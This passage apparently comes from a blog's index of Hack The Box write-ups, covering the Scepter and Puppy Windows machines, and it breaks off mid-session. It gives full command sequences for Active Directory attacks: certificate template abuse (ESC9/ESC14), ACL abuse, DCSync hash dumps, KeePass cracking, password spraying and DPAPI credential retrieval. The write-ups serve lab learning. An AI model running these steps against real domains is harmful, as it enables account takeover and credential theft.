Host: DC01; OS: Windows; CPE: cpe:/o:microsoft:windows\n\nHost script results:\n| p2p-conficker:\n|   Checking for Conficker.C or higher...\n|   Check 1 (port 18337/tcp): CLEAN (Couldn't connect)\n|   Check 2 (port 38986/tcp): CLEAN (Couldn't connect)\n|   Check 3 (port 13248/udp): CLEAN (Timeout)\n|   Check 4 (port 38399/udp): CLEAN (Failed to receive data)\n|_  0/4 checks are positive: Host is CLEAN or ports are blocked\n| smb2-time:\n|   date: 2025-08-21T02:55:43\n|_  start_date: N/A\n| smb2-security-mode:\n|   3:1:1:\n|_    Message signing enabled and required\n|_clock-skew: mean: 1h34m30s, deviation: 0s, median: 1h34m30s\n```\n\n## NFS\n\nLooking at this shows that *helpdesk* is available to mount.\n```bash\nkonoha# showmount -e 10.10.11.65\nExport list for 10.10.11.65:\n/helpdesk (everyone)\nkonoha# mount.nfs 10.10.11.65:/helpdesk someT -o nolock\nkonoha# ls someT\nbaker.crt  baker.key  clark.pfx  lewis.pfx  scott.pfx\n```\n\nLooking closer we can see if these have crackable hashes.\n```bash\nkonoha# pfx2john clark.pfx > clark.hash\nkonoha# john --wordlist=/usr/share/wordlists/rockyou.txt clark.hash\nUsing default input encoding: UTF-8\nLoaded 1 password hash (pfx, (.pfx, .p12) [PKCS#12 PBE (SHA1/SHA2) 128/128 AVX 4x])\nCost 1 (iteration count) is 2048 for all loaded hashes\nCost 2 (mac-type [1:SHA1 224:SHA224 256:SHA256 384:SHA384 512:SHA512]) is 256 for all loaded hashes\nWill run 8 OpenMP threads\nPress 'q' or Ctrl-C to abort, almost any other key for status\nnewpassword      (clark.pfx)\n```\n\nWe can now craft a pfx with *baker*'s key and cert.\n```bash\nkonoha# openssl pkcs12 -export -out baker.pfx -inkey baker.key -in baker.crt\nEnter pass phrase for baker.key:\nEnter Export Password:\nVerifying - Enter Export Password:\n```\n\nThen we can retrieve *d.baker*'s hash.\n```bash\ncertipy auth -pfx baker.pfx -domain scepter.htb -dc-ip 10.10.11.65\n\nCertipy v4.8.2 - by Oliver Lyak (ly4k)\n\n[*] Using principal: d.baker@scepter.htb\n[*] Trying to get TGT...\n[*] Got TGT\n[*] Saved credential cache to 'd.baker.ccache'\n[*] Trying to retrieve NT hash for 'd.baker'\n[*] Got hash for 'd.baker@scepter.htb': aad3b435b51404eeaad3b435b51404ee:18b5fb0d99e7a475316213c15b6f22ce\n```\n## Getting Dumped ðŸ˜ž\n\nNow we can get a bloodhound dump and examine it.\n```bash\nnxc ldap scepter.htb -u d.baker -H 18b5fb0d99e7a475316213c15b6f22ce --dns-server 10.10.11.65 --bloodhound -c All\n```\n![](/img/scepter1.png)\nAnd when we do we find that *d.baker* has `ForceChangePassword` over *a.carter*. Let's exploit that!\n```bash\nbloodyAD -d scepter.htb -u d.baker -p :18b5fb0d99e7a475316213c15b6f22ce --dc-ip 10.10.11.65 --host scepter.htb set password a.carter PasswordsSuck!\n\n[+] Password changed successfully!\n```\nThen we can look at *a.carter*'s access in bloodyAD as well as bloodhound.\n```bash\nkonoha# bloodyAD -d scepter.htb -u a.carter -p 'PasswordsSuck!' --dc-ip 10.10.11.65 --host scepter.htb get writable\n\ndistinguishedName: CN=Computers,DC=scepter,DC=htb\npermission: CREATE_CHILD; WRITE\n\ndistinguishedName: CN=S-1-5-11,CN=ForeignSecurityPrincipals,DC=scepter,DC=htb\npermission: WRITE\n\ndistinguishedName: CN=a.carter,CN=Users,DC=scepter,DC=htb\npermission: WRITE\n\ndistinguishedName: OU=Staff Access Certificate,DC=scepter,DC=htb\npermission: CREATE_CHILD; WRITE\nOWNER: WRITE\nDACL: WRITE\n```\n![](/img/serial.gif)\nIn bloodhound we can see this clearly.\n![](/img/scepter2.png)\n\nSo we can use bloodyAD.\n```bash\nkonoha# bloodyAD -d scepter.htb -u a.carter -p 'PasswordsSuck!' --dc-ip 10.10.11.65 --host scepter.htb add genericAll 'OU=STAFF ACCESS CERTIFICATE,DC=SCEPTER,DC=HTB' 'a.carter'\n[+] a.carter has now GenericAll on OU=STAFF ACCESS CERTIFICATE,DC=SCEPTER,DC=HTB\n```\nOr impacket, both get the job done.\n```bash\nimpacket-dacledit -action 'write' -rights 'FullControl' -inheritance -principal 'a.carter' -target-dn 'OU=STAFF ACCESS CERTIFICATE,DC=SCEPTER,DC=HTB' 'scepter.htb'/'a.carter':'PasswordsSuck!'\n\nImpacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies\n\n[*] NB: objects with adminCount=1 will no inherit ACEs from their parent container/OU\n[*] DACL backed up to dacledit-20250523-213935.bak\n[*] DACL modified successfully!\n```\n## ADCS\n\nLooking at ADCS we with the users we control, we find something interesting with *d.baker*.\n```bash\nkonoha# certipy find -dc-ip 10.10.11.65 -u d.baker@scepter -hashes :18b5fb0d99e7a475316213c15b6f22ce -stdout -vulnerable\nCertipy v5.0.2 - by Oliver Lyak (ly4k)\n<SNIP>\nCertificate Authorities\n  0\n    CA Name                             : scepter-DC01-CA\n    DNS Name                            : dc01.scepter.htb\n    Certificate Subject                 : CN=scepter-DC01-CA, DC=scepter, DC=htb\n    Certificate Serial Number           : 716BFFE1BE1CD1A24010F3AD0E350340\n    Certificate Validity Start          : 2024-10-31 22:24:19+00:00\n    Certificate Validity End            : 2061-10-31 22:34:19+00:00\n    Web Enrollment\n      HTTP\n        Enabled                         : False\n      HTTPS\n        Enabled                         : False\n    User Specified SAN                  : Disabled\n    Request Disposition                 : Issue\n    Enforce Encryption for Requests     : Enabled\n    Active Policy                       : CertificateAuthority_MicrosoftDefault.Policy\n    Permissions\n      Owner                             : SCEPTER.HTB\\Administrators\n      Access Rights\n        ManageCa                        : SCEPTER.HTB\\Administrators\n                                          SCEPTER.HTB\\Domain Admins\n                                          SCEPTER.HTB\\Enterprise Admins\n        ManageCertificates              : SCEPTER.HTB\\Administrators\n                                          SCEPTER.HTB\\Domain Admins\n                                          SCEPTER.HTB\\Enterprise Admins\n        Enroll                          : SCEPTER.HTB\\Authenticated Users\nCertificate Templates\n  0\n    Template Name                       : StaffAccessCertificate\n    Display Name                        : StaffAccessCertificate\n    Certificate Authorities             : scepter-DC01-CA\n    Enabled                             : True\n    Client Authentication               : True\n    Enrollment Agent                    : False\n    Any Purpose                         : False\n    Enrollee Supplies Subject           : False\n    Certificate Name Flag               : SubjectAltRequireEmail\n                                          SubjectRequireDnsAsCn\n                                          SubjectRequireEmail\n    Enrollment Flag                     : AutoEnrollment\n                                          NoSecurityExtension\n    Extended Key Usage                  : Client Authentication\n                                          Server Authentication\n    Requires Manager Approval           : False\n    Requires Key Archival               : False\n    Authorized Signatures Required      : 0\n    Schema Version                      : 2\n    Validity Period                     : 99 years\n    Renewal Period                      : 6 weeks\n    Minimum RSA Key Length              : 2048\n    Template Created                    : 2024-11-01T02:29:00+00:00\n    Template Last Modified              : 2024-11-01T09:00:54+00:00\n    Permissions\n      Enrollment Permissions\n        Enrollment Rights               : SCEPTER.HTB\\staff\n      Object Control Permissions\n        Owner                           : SCEPTER.HTB\\Enterprise Admins\n        Full Control Principals         : SCEPTER.HTB\\Domain Admins\n                                          SCEPTER.HTB\\Local System\n                                          SCEPTER.HTB\\Enterprise Admins\n        Write Owner Principals          : SCEPTER.HTB\\Domain Admins\n                                          SCEPTER.HTB\\Local System\n                                          SCEPTER.HTB\\Enterprise Admins\n        Write Dacl Principals           : SCEPTER.HTB\\Domain Admins\n                                          SCEPTER.HTB\\Local System\n                                          SCEPTER.HTB\\Enterprise Admins\n    [+] User Enrollable Principals      : SCEPTER.HTB\\staff\n    [!] Vulnerabilities\n      ESC9                              : Template has no security extension.\n    [*] Remarks\n      ESC9         \n```\n\nLooks as we have *ESC9*, and as *a.carter*, we control *d.baker*.\n```bash\nkonoha# bloodyAD -d scepter.htb -u a.carter -p 'PasswordsSuck!' --dc-ip 10.10.11.65 --host scepter.htb get writable\n\ndistinguishedName: CN=Computers,DC=scepter,DC=htb\npermission: CREATE_CHILD; WRITE\n\ndistinguishedName: CN=S-1-5-11,CN=ForeignSecurityPrincipals,DC=scepter,DC=htb\npermission: WRITE\n\ndistinguishedName: CN=d.baker,OU=Staff Access Certificate,DC=scepter,DC=htb\npermission: CREATE_CHILD; WRITE\nOWNER: WRITE\nDACL: WRITE\n\ndistinguishedName: CN=a.carter,CN=Users,DC=scepter,DC=htb\npermission: WRITE\n\ndistinguishedName: OU=Staff Access Certificate,DC=scepter,DC=htb\npermission: CREATE_CHILD; WRITE\nOWNER: WRITE\nDACL: WRITE\n```\nSo we can set an attribute(mail) to a user we want control of. Looking at who has Remote Access, we can try *h.brown*. We can update *d.baker*'s attribute to reflect that of *h.brown*.\n```bash\nbloodyAD -d scepter.htb -u a.carter -p PasswordsSuck! --dc-ip 10.10.11.65 --host scepter.htb set object d.baker mail -v 'h.brown@scepter.htb'\n\n[+] d.baker's mail has been updated\n```\nThen we request a cert using the *StaffAccessTemplate* using *h.brown* as the upn.\n```bash\ncertipy req -username d.baker@scepter.htb -hashes :18b5fb0d99e7a475316213c15b6f22ce -dc-ip 10.10.11.65 -ca 'scepter-DC01-CA' -template 'StaffAccessCertificate' -ns 10.10.11.65 -target 'DC01.scepter.htb' -target-ip 10.10.11.65 -upn 'h.brown@scepter.htb'\nCertipy v4.8.2 - by Oliver Lyak (ly4k)\n\n[*] Requesting certificate via RPC\n[*] Successfully requested certificate\n[*] Request ID is 44\n[*] Got certificate without identification\n[*] Certificate has no object SID\n[*] Saved certificate and private key to 'd.baker.pfx'\n```\n\nFinally, we authenticate with the pfx file, but using the username *h.brown* as identified in the upn.\n```bash\ncertipy auth -pfx d.baker.pfx -domain scepter.htb -dc-ip 10.10.11.65 -username h.brown\n\nCertipy v4.8.2 - by Oliver Lyak (ly4k)\n\n[!] Could not find identification in the provided certificate\n[*] Using principal: h.brown@scepter.htb\n[*] Trying to get TGT...\n[*] Got TGT\n[*] Saved credential cache to 'h.brown.ccache'\n[*] Trying to retrieve NT hash for 'h.brown'\n[*] Got hash for 'h.brown@scepter.htb': aad3b435b51404eeaad3b435b51404ee:4ecf5242092c6fb8c360a08069c75a0c\n```\n## Brown you slay me!\n![](/img/animal.gif)\nOn the box as *h.brown*, we can look around and find the user flag. Yet there wasn't much else. \n```bash\nkonoha# evil-winrm -i DC01.scepter.htb -u h.brown -r scepter.htb\n\nEvil-WinRM shell v3.7\n\nWarning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc' for module Reline\n\nData: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion\n\nWarning: User is not needed for Kerberos auth. Ticket will be used\n\nInfo: Establishing connection to remote endpoint\n*Evil-WinRM* PS C:\\Users\\h.brown\\Documents>\n```\n\nWe did have some other users, and *p.adams* looks interesting as they are in the *Replication Operators* group. Meaning, we get ahold of them, we can dcsync. We can look more at this user and what permissions we have as well. Which when we do we see we have WRITE over *p.adams*. \n```bash\nkonoha# bloodyAD -d scepter.htb -u h.brown -k --dc-ip 10.10.11.65 --host DC01.scepter.htb get writable\n\ndistinguishedName: CN=S-1-5-11,CN=ForeignSecurityPrincipals,DC=scepter,DC=htb\npermission: WRITE\n\ndistinguishedName: CN=h.brown,CN=Users,DC=scepter,DC=htb\npermission: WRITE\n\ndistinguishedName: CN=p.adams,OU=Helpdesk Enrollment Certificate,DC=scepter,DC=htb\npermission: WRITE\n```\nWith the *StaffAccessCertificate* we saw it requires an email, so we can give it one but abusing weak explicit certificate mapping(ESC14). First, we need to update the *altSecurityIdentities* of p.adams. \n```bash\nbloodyAD -d scepter.htb -u h.brown -k --dc-ip 10.10.11.65 --host DC01.scepter.htb set object p.adams altSecurityIdentities -v 'X509:<RFC822>p.adams@scepter.htb'\n[+] p.adams's altSecurityIdentities has been updated\n```\n\nThen point to that using our controlled user and updating their mail attribute accordingly.\n```bash\nbloodyAD -d scepter.htb -u a.carter -p PasswordsSuck! --dc-ip 10.10.11.65 --host scepter.htb set object d.baker mail -v 'p.adams@scepter.htb'\n[+] d.baker's mail has been updated\n```\n## We spit in your general direction\n\nLastly, we can request a certificate using *d.baker*, but requesting with UPN *p.adams*.\n```bash\ncertipy req -username d.baker@scepter.htb -hashes aad3b435b51404eeaad3b435b51404ee:18b5fb0d99e7a475316213c15b6f22ce -dc-ip 10.10.11.65 -ca 'scepter-DC01-CA' -template 'StaffAccessCertificate' -ns 10.10.11.65 -target 'DC01.scepter.htb' -target-ip 10.10.11.65 -upn 'p.adams@scepter.htb'\nCertipy v4.8.2 - by Oliver Lyak (ly4k)\n\n[*] Requesting certificate via RPC\n[*] Successfully requested certificate\n[*] Request ID is 51\n[*] Got certificate without identification\n[*] Certificate has no object SID\n[*] Saved certificate and private key to 'd.baker.pfx'\n```\n\nThen we can finally authenticate with that pfx file with username *p.adams*.\n```bash\ncertipy auth -pfx d.baker.pfx -domain scepter.htb -dc-ip 10.10.11.65 -username p.adams\nCertipy v4.8.2 - by Oliver Lyak (ly4k)\n\n[!] Could not find identification in the provided certificate\n[*] Using principal: p.adams@scepter.htb\n[*] Trying to get TGT...\n[*] Got TGT\n[*] Saved credential cache to 'p.adams.ccache'\n[*] Trying to retrieve NT hash for 'p.adams'\n[*] Got hash for 'p.adams@scepter.htb': aad3b435b51404eeaad3b435b51404ee:1b925c524f447bb821a8789c4b118ce0\n```\n## Too Many Secrets\n\nReplication Operators can just DCSYNC. So lets do that!!! ðŸ˜‚\n```bash\nimpacket-secretsdump -dc-ip 10.10.11.65 -hashes aad3b435b51404eeaad3b435b51404ee:1b925c524f447bb821a8789c4b118ce0 'scepter.htb/p.adams'@scepter.htb\n\nImpacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies\n\n[-] RemoteOperations failed: DCERPC Runtime Error: code: 0x5 - rpc_s_access_denied\n[*] Dumping Domain Credentials (domain\\uid:rid:lmhash:nthash)\n[*] Using the DRSUAPI method to get NTDS.DIT secrets\nAdministrator:500:aad3b435b51404eeaad3b435b51404ee:a291ead3493f9773dc615e66c2ea21c4:::\nGuest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::\nkrbtgt:502:aad3b435b51404eeaad3b435b51404ee:c030fca580038cc8b1100ee37064a4a9:::\nscepter.htb\\d.baker:1106:aad3b435b51404eeaad3b435b51404ee:18b5fb0d99e7a475316213c15b6f22ce:::\n```\n\n![](/img/robocop.gif)","tags":["ADCS","GenericAll","DACL Abuse","openssl","ForceChangePassword","ESC14"],"categories":["htb"]},{"title":"Puppy (Windows Medium)","url":"/2025/05/17/Puppy/","content":"\n![](/img/puppy.png)\n\nThis Windows Medium box starts with our user having write permissions over the DEVELOPERS group. Once we look at shares we find available to use the DEV share. In this share lies a keepass database, which we exfiltrate to our machine. Once done we crack the password to the database and discover users and credentials. After password spraying we have another valid user, and this user is in the SENIOR DEVS group, with GenericAll to user Adam.Silver. After re-enabling his account, we can finally get on the box. Going to the root directory we find a Backups directory with a zip file containing an xml file with credentials for Steph.Cooper. Using these credentials we login, and if we looked at bloodhound or other users we noticed a steph.cooper_adm. With access to this users AppData we exfiltrate the file required for DPAPI. Once we dump DPAPI, we find credentials for steph.cooper_adm.\n\n\n*Starts as an assumed breach with credentials: levi.james / KingofAkron2025!*\n## Initial Nmap\n```\nPORT     STATE SERVICE       REASON          VERSION\n53/tcp   open  domain        syn-ack ttl 127 Simple DNS Plus\n88/tcp   open  kerberos-sec  syn-ack ttl 127 Microsoft Windows Kerberos (server time: 2025-08-19 23:17:01Z)\n111/tcp  open  rpcbind       syn-ack ttl 127 2-4 (RPC #100000)\n| rpcinfo:\n|   program version    port/proto  service\n|   100000  2,3,4        111/tcp   rpcbind\n|   100000  2,3,4        111/tcp6  rpcbind\n|   100000  2,3,4        111/udp   rpcbind\n|   100000  2,3,4        111/udp6  rpcbind\n|   100003  2,3         2049/udp   nfs\n|   100003  2,3         2049/udp6  nfs\n|   100005  1,2,3       2049/udp   mountd\n|   100005  1,2,3       2049/udp6  mountd\n|   100021  1,2,3,4     2049/tcp   nlockmgr\n|   100021  1,2,3,4     2049/tcp6  nlockmgr\n|   100021  1,2,3,4     2049/udp   nlockmgr\n|   100021  1,2,3,4     2049/udp6  nlockmgr\n|   100024  1           2049/tcp   status\n|   100024  1           2049/tcp6  status\n|   100024  1           2049/udp   status\n|_  100024  1           2049/udp6  status\n135/tcp  open  msrpc         syn-ack ttl 127 Microsoft Windows RPC\n139/tcp  open  netbios-ssn   syn-ack ttl 127 Microsoft Windows netbios-ssn\n389/tcp  open  ldap          syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: PUPPY.HTB0., Site: Default-First-Site-Name)\n445/tcp  open  microsoft-ds? syn-ack ttl 127\n464/tcp  open  kpasswd5?     syn-ack ttl 127\n593/tcp  open  ncacn_http    syn-ack ttl 127 Microsoft Windows RPC over HTTP 1.0\n636/tcp  open  tcpwrapped    syn-ack ttl 127\n2049/tcp open  nlockmgr      syn-ack ttl 127 1-4 (RPC #100021)\n3260/tcp open  iscsi?        syn-ack ttl 127\n3268/tcp open  ldap          syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: PUPPY.HTB0., Site: Default-First-Site-Name)\n3269/tcp open  tcpwrapped    syn-ack ttl 127\n5985/tcp open  http          syn-ack ttl 127 Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)\n|_http-server-header: Microsoft-HTTPAPI/2.0\n|_http-title: Not Found\nService Info: Host: DC; OS: Windows; CPE: cpe:/o:microsoft:windows\n\nHost script results:\n| smb2-time:\n|   date: 2025-08-19T23:18:50\n|_  start_date: N/A\n|_clock-skew: -55m40s\n| smb2-security-mode:\n|   3:1:1:\n|_    Message signing enabled and required\n| p2p-conficker:\n|   Checking for Conficker.C or higher...\n|   Check 1 (port 62785/tcp): CLEAN (Timeout)\n|   Check 2 (port 31083/tcp): CLEAN (Timeout)\n|   Check 3 (port 26380/udp): CLEAN (Timeout)\n|   Check 4 (port 63353/udp): CLEAN (Timeout)\n|_  0/4 checks are positive: Host is CLEAN or ports are blocked\n```\n\n## What are we doing as the KING\n\nAt first, I wanted to check and see what we have writable.\n```\nkonoha# bloodyAD -v DEBUG -d puppy.htb -u levi.james -p 'KingofAkron2025!' --dc-ip 10.10.11.70 --host puppy.htb get writable\n[+] Connection URL: ldap+ntlm-pw://puppy.htb\\levi.james:KingofAkron2025%21@puppy.htb/?serverip=10.10.11.70\n[*] Trying to connect to puppy.htb...\n[+] Connection successful\n\ndistinguishedName: CN=S-1-5-11,CN=ForeignSecurityPrincipals,DC=PUPPY,DC=HTB\npermission: WRITE\n\ndistinguishedName: CN=Levi B. James,OU=MANPOWER,DC=PUPPY,DC=HTB\npermission: WRITE\n\ndistinguishedName: CN=DEVELOPERS,DC=PUPPY,DC=HTB\npermission: WRITE\n```\n\nThis shows us we can add ourselves to this group since we have write.\n```\nkonoha# bloodyAD -v DEBUG -d puppy.htb -u levi.james -p 'KingofAkron2025!' --dc-ip 10.10.11.70 --host puppy.htb add groupMember 'Developers' 'levi.james'\n[+] Connection URL: ldap+ntlm-pw://puppy.htb\\levi.james:KingofAkron2025%21@puppy.htb/?serverip=10.10.11.70\n[*] Trying to connect to puppy.htb...\n[+] Connection successful\n[+] levi.james added to Developers\n```\n\n## Getting to know one another ðŸ˜‘\n\nSo I went ahead and got a bloodhound dump for later use when we're futher.\n```\nkonoha# rusthound -z -u levi.james@puppy.htb -p 'KingofAkron2025!' -f DC.puppy.htb -d puppy.htb -i 10.10.11.70\n```\n## What were you hiding??\n\nBefore we didn't have read access over the DEV share. Now we can see what lingers in this share.\n```\nkonoha# impacket-smbclient 'puppy.htb/levi.james:KingofAkron2025!@puppy.htb'\nImpacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies\n\nType help for list of commands\n# use DEV\n# ls\ndrw-rw-rw-          0  Sun Mar 23 02:07:57 2025 .\ndrw-rw-rw-          0  Sat Mar  8 10:52:57 2025 ..\n-rw-rw-rw-   34394112  Sun Mar 23 02:09:12 2025 KeePassXC-2.7.9-Win64.msi\ndrw-rw-rw-          0  Sun Mar  9 15:16:16 2025 Projects\n-rw-rw-rw-       2677  Tue Mar 11 21:25:46 2025 recovery.kdbx\n# mget recovery.kdbx\n[*] Downloading recovery.kdbx\n```\nA keepass database, we can crack this hash using *keepass2john*, or I just used *keepass4brute.sh*.\n```\nkonoha# ./keepass4brute.sh ~/Documents/htb/machines/TMP/recovery.kdbx /usr/share/wordlists/rockyou.txt\nkeepass4brute 1.3 by r3nt0n\nhttps://github.com/r3nt0n/keepass4brute\n\n[+] Words tested: 36/14344393 - Attempts per minute: 86 - Estimated time remaining: 16 weeks, 3 days\n[+] Current attempt: liverpool\n\n[*] Password found: liverpool\n```\n\n## Show me your moves!!\n\nOnce in the database we have some users and some passwords we can sort through.\n![](/img/puppy1.png)\n\nWe can go and password spray, once we do we get a hit.\n```\nkonoha# nxc smb puppy.htb -u users.lst -p passwd.lst --continue-on-success\nSMB         10.10.11.70     445    DC               [*] Windows Server 2022 Build 20348 x64 (name:DC) (domain:PUPPY.HTB) (signing:True) (SMBv1:False)\n<SNIP>\nSMB         10.10.11.70     445    DC               [-] PUPPY.HTB\\levi.james:Antman2025! STATUS_LOGON_FAILURE\nSMB         10.10.11.70     445    DC               [+] PUPPY.HTB\\ant.edwards:Antman2025!\nSMB         10.10.11.70     445    DC               [-] PUPPY.HTB\\adam.silver:Antman2025! STATUS_LOGON_FAILURE\n```\n\nLets see what he has in bloodhound.\n![](/img/puppy2.png)\n\nSo *GenericAll*, we can simply just change his password and get on the box.\n```\nkonoha# bloodyAD -v DEBUG -d puppy.htb -u ant.edwards -p 'Antman2025!' --dc-ip 10.10.11.70 --host puppy.htb set password adam.silver 'SuperSecurePassword123!'\n[+] Connection URL: ldap+ntlm-pw://puppy.htb\\ant.edwards:Antman2025%21@puppy.htb/?serverip=10.10.11.70\n[*] Trying to connect to puppy.htb...\n[+] Connection successful\n[+] Password changed successfully!\n```\nWe can try to evil-winrm with his account but when we don't get connected, looking more at his account explains.\n```\nkonoha# bloodyAD -v DEBUG -d puppy.htb -u ant.edwards -p 'Antman2025!' --dc-ip 10.10.11.70 --host puppy.htb get object adam.silver\n[+] Connection URL: ldap+ntlm-pw://puppy.htb\\ant.edwards:Antman2025%21@puppy.htb/?serverip=10.10.11.70\n[*] Trying to connect to puppy.htb...\n[+] Connection successful\n\ndistinguishedName: CN=Adam D. Silver,CN=Users,DC=PUPPY,DC=HTB\naccountExpires: 9999-12-31 23:59:59.999999+00:00\n<SNIP>\nsAMAccountName: adam.silver\nsAMAccountType: 805306368\nsn: Silver\nuSNChanged: 176441\nuSNCreated: 12814\nuserAccountControl: ACCOUNTDISABLE; NORMAL_ACCOUNT; DONT_EXPIRE_PASSWORD\n```\n\nWe can see its disabled, so we can simply remove the *ACCOUNTDISABLE* flag and try again.\n```\nkonoha# bloodyAD -v DEBUG -d puppy.htb -u ant.edwards -p 'Antman2025!' --dc-ip 10.10.11.70 --host puppy.htb remove uac adam.silver -f ACCOUNTDISABLE\n[+] Connection URL: ldap+ntlm-pw://puppy.htb\\ant.edwards:Antman2025%21@puppy.htb/?serverip=10.10.11.70\n[*] Trying to connect to puppy.htb...\n[+] Connection successful\n[-] ['ACCOUNTDISABLE'] property flags removed from adam.silver's userAccountControl\n```\n![](/img/great.gif)\n## Silver Surfing\n\nOnce connected, we look at the root directory.\n```\n*Evil-WinRM* PS C:\\> ls -fo\n\n\n    Directory: C:\\\n\n\nMode                 LastWriteTime         Length Name\n----                 -------------         ------ ----\nd--hs-         2/28/2025  12:31 PM                $Recycle.Bin\nd--h--         5/12/2025   5:29 PM                $WinREAgent\nd-----          5/9/2025  10:48 AM                Backups\nd--hsl         2/19/2025  11:32 AM                Documents and Settings\nd-----         5/12/2025   5:21 PM                inetpub\nd-----          5/8/2021   1:20 AM                PerfLogs\n<SNIP>\n```\nWe see a backups directory, and when checking that out we find a *site-backup-2024-12-30.zip*. \n```\n*Evil-WinRM* PS C:\\Backups> ls\n\n\n    Directory: C:\\Backups\n\n\nMode                 LastWriteTime         Length Name\n----                 -------------         ------ ----\n-a----          3/8/2025   8:22 AM        4639546 site-backup-2024-12-30.zip\n```\n\nOnce we download this and look at it, only one file looks interesting.\n```\n*Evil-WinRM* PS C:\\Backups> ls\n\n\n    Directory: C:\\Backups\n\n\nMode                 LastWriteTime         Length Name\n----                 -------------         ------ ----\n-a----          3/8/2025   8:22 AM        4639546 site-backup-2024-12-30.zip\n\n\n*Evil-WinRM* PS C:\\Backups> download site-backup-2024-12-30.zip\n\nInfo: Downloading C:\\Backups\\site-backup-2024-12-30.zip to site-backup-2024-12-30.zip\n\nInfo: Download successful!\n```\n\n### Backup Files suck dude!!!\n\nHere we download the file and check it out, revealing credentials.\n```\nkonoha# unzip site-backup-2024-12-30.zip puppy/nms-auth-config.xml.bak\n```\nFrom the backup xml file we have found the key.\n```\nkonoha# cat nms-auth-config.xml.bak\n<?xml version=\"1.0\" encoding=\"UTF-8\"?>\n<ldap-config>\n    <server>\n        <host>DC.PUPPY.HTB</host>\n        <port>389</port>\n        <base-dn>dc=PUPPY,dc=HTB</base-dn>\n        <bind-dn>cn=steph.cooper,dc=puppy,dc=htb</bind-dn>\n        <bind-password>ChefSteph2025!</bind-password>\n    </server>\n```\n## Lets get intersteller coop!!\n\nWe can login and take a look around, but there's nothing we haven't already seen. So the only thing to do is check *DPAPI*.\n\n```\n*Evil-WinRM* PS C:\\Users\\steph.cooper\\AppData\\Roaming\\Microsoft\\Credentials> ls -h\n\n\n    Directory: C:\\Users\\steph.cooper\\AppData\\Roaming\\Microsoft\\Credentials\n\n\nMode                 LastWriteTime         Length Name\n----                 -------------         ------ ----\n-a-hs-          3/8/2025   7:54 AM            414 C8D69EBE9A43E9DEBF6B5FBD48B521B9\n\n\n*Evil-WinRM* PS C:\\Users\\steph.cooper\\AppData\\Roaming\\Microsoft\\Credentials> attrib -H C8D69EBE9A43E9DEBF6B5FBD48B521B9\nNot resetting system file - C:\\Users\\steph.cooper\\AppData\\Roaming\\Microsoft\\Credentials\\C8D69EBE9A43E9DEBF6B5FBD48B521B9\n*Evil-WinRM* PS C:\\Users\\steph.cooper\\AppData\\Roaming\\Microsoft\\Credentials> attrib -S -H C8D69EBE9A43E9DEBF6B5FBD48B521B9\n*Evil-WinRM* PS C:\\Users\\steph.cooper\\AppData\\Roaming\\Microsoft\\Credentials> ls\n\n\n    Directory: C:\\Users\\steph.cooper\\AppData\\Roaming\\Microsoft\\Credentials\n\n\nMode                 LastWriteTime         Length Name\n----                 -------------         ------ ----\n-a----          3/8/2025   7:54 AM            414 C8D69EBE9A43E9DEBF6B5FBD48B521B9\n\n\n*Evil-WinRM* PS C:\\Users\\steph.cooper\\AppData\\Roaming\\Microsoft\\Credentials> download C8D69EBE9A43E9DEBF6B5FBD48B521B9\n\nInfo: Downloading C:\\Users\\steph.cooper\\AppData\\Roaming\\Microsoft\\Credentials\\C8D69EBE9A43E9DEBF6B5FBD48B521B9 to C8D69EBE9A43E9DEBF6B5FBD48B521B9\n\nInfo: Download successful!\n*Evil-WinRM* PS C:\\Users\\steph.cooper\\AppData\\Roaming\\Microsoft\\Credentials> cd ..\n*Evil-WinRM* PS C:\\Users\\steph.cooper\\AppData\\Roaming\\Microsoft> ls\n\n\n    Directory: C:\\Users\\steph.cooper\\AppData\\Roaming\\Microsoft\n\n\nMode                 LastWriteTime         Length Name\n----                 -------------         ------ ----\nd---s-          3/8/2025   7:53 AM                Credentials\nd---s-          3/8/2025   7:40 AM                Crypto\nd-----          3/8/2025   7:40 AM                Internet Explorer\nd-----          3/8/2025   7:40 AM                Network\nd---s-          3/8/2025   7:40 AM                Protect\nd-----          5/8/2021   1:20 AM                Spelling\nd---s-         2/23/2025   2:35 PM                SystemCertificates\nd-----         2/23/2025   2:36 PM                Vault\nd-----          3/8/2025   7:52 AM                Windows\n\n\n*Evil-WinRM* PS C:\\Users\\steph.cooper\\AppData\\Roaming\\Microsoft> cd windows\n*Evil-WinRM* PS C:\\Users\\steph.cooper\\AppData\\Roaming\\Microsoft\\windows> ls\n\n\n    Directory: C:\\Users\\steph.cooper\\AppData\\Roaming\\Microsoft\\windows\n\n\nMode                 LastWriteTime         Length Name\n----                 -------------         ------ ----\nd-r---          3/8/2025   7:40 AM                AccountPictures\nd-----          5/8/2021   1:20 AM                CloudStore\nd-r---          3/8/2025   7:40 AM                Libraries\nd-----          5/8/2021   1:20 AM                Network Shortcuts\nd-----          5/8/2021   1:20 AM                Printer Shortcuts\nd-r---          3/8/2025   7:40 AM                Recent\nd-r---          3/8/2025   7:40 AM                SendTo\nd-----          3/8/2025   7:52 AM                ServerManager\nd-r---          3/8/2025   7:40 AM                Start Menu\nd-----          5/8/2021   1:20 AM                Templates\nd-----          3/8/2025   8:01 AM                Themes\n\n\n*Evil-WinRM* PS C:\\Users\\steph.cooper\\AppData\\Roaming\\Microsoft\\windows> cd ..\n*Evil-WinRM* PS C:\\Users\\steph.cooper\\AppData\\Roaming\\Microsoft> ls\n\n\n    Directory: C:\\Users\\steph.cooper\\AppData\\Roaming\\Microsoft\n\n\nMode                 LastWriteTime         Length Name\n----                 -------------         ------ ----\nd---s-          3/8/2025   7:53 AM                Credentials\nd---s-          3/8/2025   7:40 AM                Crypto\nd-----          3/8/2025   7:40 AM                Internet Explorer\nd-----          3/8/2025   7:40 AM                Network\nd---s-          3/8/2025   7:40 AM                Protect\nd-----          5/8/2021   1:20 AM                Spelling\nd---s-         2/23/2025   2:35 PM                SystemCertificates\nd-----         2/23/2025   2:36 PM                Vault\nd-----          3/8/2025   7:52 AM                Windows\n\n\n*Evil-WinRM* PS 